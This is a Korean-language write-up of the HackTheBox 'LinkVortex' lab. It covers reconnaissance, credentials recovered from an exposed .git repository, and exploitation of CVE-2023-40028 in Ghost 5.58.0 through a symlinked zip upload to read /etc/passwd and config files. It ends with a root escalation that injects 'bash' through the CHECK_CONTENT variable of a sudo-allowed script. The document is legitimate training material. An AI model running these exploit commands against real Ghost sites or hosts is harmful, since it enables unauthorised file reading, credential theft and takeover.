# LinkVortex - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA linkvortex 10.129.231.194
```
<img width="1104" height="284" alt="image" src="https://github.com/user-attachments/assets/45ccc285-28e5-4649-a995-a0d7a64f5e5a" />

- SSH(22)
- HTTP(80)

<br>

- `/etc/hosts`에 `linkvortex.htb`추가.
<img width="1104" height="66" alt="image" src="https://github.com/user-attachments/assets/0f40ab01-2de4-478d-8e98-32291b269881" />

---
## HTTP(80)
### banner grabbing
<img width="1104" height="337" alt="image" src="https://github.com/user-attachments/assets/bbdbd0af-1d03-4830-9b41-09a1b59f0af2" />

### robots.txt
- `/ghost` 발견.
<img width="1104" height="156" alt="image" src="https://github.com/user-attachments/assets/2716f14a-72e3-4ea6-a849-2fe65ca7a7f9" />

<br>
<br>

- 로그인 페이지로 이동됨.
- 기본 비밀번호로 로그인 시도하였으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/e0b4746a-bdd8-4b34-84f5-94be4838bdc4" />

### VHOST
- `dev.linkvortex.htb` 발견.
<img width="1104" height="24" alt="image" src="https://github.com/user-attachments/assets/d3a2d175-2ba5-4ec5-abcb-8f1cf3ba48e9" />

<br>
<br>

- `/etc/hosts`에 추가.
<img width="1104" height="59" alt="image" src="https://github.com/user-attachments/assets/bdd22bfc-1c70-46eb-aee9-3da047a6a9a3" />

### gobuster
- `.git` 발견.
```bash
obuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.linkvortex.htb -x php,md,txt -t 50
```
<img width="1104" height="388" alt="image" src="https://github.com/user-attachments/assets/2341e75d-f14e-4f55-a182-2dc72dbb257e" />

### .git
- `git-dumper`를 사용하여 덤핑.
```bash
git-dumper http://dev.linkvortex.htb git
```
<img width="1104" height="427" alt="image" src="https://github.com/user-attachments/assets/71cf4b2a-346e-4621-94f4-29a5ad152d67" />

<br>
<br>

- `Dockerfile.ghost`이 새로 생성되고 `./ghost/core/test/regression/api/admin/authentication.test.js`가 수정되었음을 확인.
```bash
git status
```
<img width="1104" height="147" alt="image" src="https://github.com/user-attachments/assets/141efe7e-7160-4b18-b7e9-a3ab8557819f" />

<br>
<br>

- 마지막으로 커밋된 깃과 비교를 해보니 비밀번호가 수정됨.
```bash
git diff 299cdb4387763f850887275a716153e84793077d
```
<img width="1104" height="101" alt="image" src="https://github.com/user-attachments/assets/a6219849-df0b-4d98-a46c-e2e2da20556a" />

<br>
<br>

- `test@example.com:OctopiFociPilfer45` 로그인 시도하였으나 실패.
- `admin@linkvortex.htb:OctopiFociPilfer45` 로그인 시도하여 성공.
- `Ghost 5.58.0`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/4d3e23e8-3597-4f43-accd-3b2db97f6476" />

### CVE-2023-40028
- https://nvd.nist.gov/vuln/detail/CVE-2023-40028
<img width="1222" height="531" alt="image" src="https://github.com/user-attachments/assets/2778be1c-564d-4929-8616-ed60e45cd8a5" />

<br>
<br>

- https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
- `/exploit/content/images/2024` 폴더를 생성하고 `test.png` 링크 파일 생성.
```bash
ln -s '/etc/passwd' 'test.png'
```
<img width="1105" height="132" alt="image" src="https://github.com/user-attachments/assets/dd177f28-0f63-4dde-8097-36dc84b3ca82" />

<br>
<br>

- `exploit.zip`으로 압축.
```bash
zip -r -y exploit.zip exploit/
```
<img width="1105" height="146" alt="image" src="https://github.com/user-attachments/assets/60dbdcc1-fda9-483d-97fd-8dc90f3929cb" />

<br>
<br>

- `admin@linkvortex.htb` 쿠키 확인.
<img width="784" height="74" alt="image" src="https://github.com/user-attachments/assets/70d3720e-2221-439a-addc-8f07284dcea1" />

<br>
<br>

- 압축 파일 업로드.
```bash
curl -s -b 'ghost-admin-api-session=s%3AUjzfo2SR_adSziFb9LOPdZSKhi2h_ucm.ucjgc7T5CxHUtvd3f64HQU6bJ7QkiJEyV48gg68%2BRe4' -X POST -F 'importfile=@/home/kali/htb/exploit.zip;type=application/zip' 'http://linkvortex.htb/ghost/api/v3/admin/db'
```
<img width="1103" height="104" alt="image" src="https://github.com/user-attachments/assets/0e3197ce-8716-4ca0-93cf-82a41c4687bd" />

<br>
<br>

- `/etc/passwd` 파일을 읽을 수 있게 됨.
```bash
curl -s -b 'ghost-admin-api-session=s%3AUjzfo2SR_adSziFb9LOPdZSKhi2h_ucm.ucjgc7T5CxHUtvd3f64HQU6bJ7QkiJEyV48gg68%2BRe4' 'http://linkvortex.htb/content/images/2024/test.png'
```
<img width="1103" height="445" alt="image" src="https://github.com/user-attachments/assets/e4671b46-3618-416d-834a-28ce30fe63fa" />

<br>
<br>

- `git`에서 `Dockerfile.ghost`를 확인해보면 `config.production.json`의 위치가 적혀 있음.
<img width="1103" height="377" alt="image" src="https://github.com/user-attachments/assets/f605044b-ff85-4057-af17-53238017a6d1" />

<br>
<br>

- 스크립트를 사용하여 해당 파일을 읽어 `bob` 유저 계정 획득.
```bash
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
```
<img width="1103" height="233" alt="image" src="https://github.com/user-attachments/assets/c3d789d1-1bcd-406b-8d3c-cfb7a6188f7d" />

<br>
<br>

- `bob:fibber-talented-worth` SSH 로그인.
```bash
ssh bob@10.129.231.194
```
<img width="1103" height="365" alt="image" src="https://github.com/user-attachments/assets/ea80b4a7-1032-4f84-b352-27bce4ba3001" />

---
## Privesc
- `/opt/ghost/clean_symlink.sh`를 `root`권한으로 실행 가능.
<img width="1103" height="157" alt="image" src="https://github.com/user-attachments/assets/5deb5833-c161-4168-bec2-5a09f2a63012" />

<br>
<br>

- `CHECK_CONTENT` 환경 변수를 확인한 후 링크파일의 확장자가 `png`인지 확인.
<img width="1103" height="291" alt="image" src="https://github.com/user-attachments/assets/d4c21967-289c-47bf-bc18-58432186c9bb" />

<br>
<br>

- 링크파일인지 확인한 후  `etc` 혹은 `root`가 포함되어 있을 경우 링크 해제.
<img width="1103" height="118" alt="image" src="https://github.com/user-attachments/assets/b030600b-9a7b-436e-9d3b-4cb39e6d855e" />

<br>
<br>

- 문제가 없다면 링크파일을 `/var/quarantined`로 이동.
<img width="1103" height="118" alt="image" src="https://github.com/user-attachments/assets/e26309e9-8e1e-48c3-a34b-01e873f79a71" />

### 환경변수 교체
- `bash`에서는 프로그래밍 언어처럼 `True` 혹은 `False` boolean이 없다.
- `CHECK_CONTENT` 환경변수를 `bash`로 교체할 경우 `if bash`로 변경되어 `bash`가 실행될 수 있다.
<img width="1103" height="81" alt="image" src="https://github.com/user-attachments/assets/e8c78573-170b-4bf9-bbf9-eafd8958465a" />

<br>
<br>

- `/etc/passwd`를 첫번째 링크 파일로 생성.
- 첫번째 링크 파일을 `png`확장자를 사용하여 두번째 링크 파일 생성.
- 환경변수를 `bash`로 설정하고 스크립트 실행하여 `root` 획득.
```bash
ln -sf /etc/passwd a

ln -sf a b.png

sudo CHECK_CONTENT=bash /usr/bin/bash /opt/ghost/clean_symlink.sh b.png
```
<img width="1103" height="116" alt="image" src="https://github.com/user-attachments/assets/3612a7a6-909f-46fd-a757-9ebf6f074646" />

### `/root/root.txt`를 링크파일로 생성.
- `/root/root.txt`를 첫번째 링크 파일로 생성.
- 첫번째 링크 파일을 `png`확장자를 사용하여 두번째 링크 파일 생성.
- 상대경로로 작동하지 않아 절대 경로로 시도.
- 환경변수를 `true`로 설정하고 스크립트를 실행하면 `root.txt` FLAG 획득.
```bash
ln -sf /root/root.txt /home/bob/a

ln -sf /home/bob/a /home/bob/b.png

sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/b.png
```
<img width="1103" height="97" alt="image" src="https://github.com/user-attachments/assets/3ebb961b-c5b4-487a-91cf-c5849824beba" />

---
## FLAG
- `/home/bob/user.txt`
<img width="1103" height="212" alt="image" src="https://github.com/user-attachments/assets/8317e44a-1e00-4710-a0f0-87ddf35dc4cb" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="230" alt="image" src="https://github.com/user-attachments/assets/27ea4b71-55e5-454c-aef3-97eaf13a1a9f" />
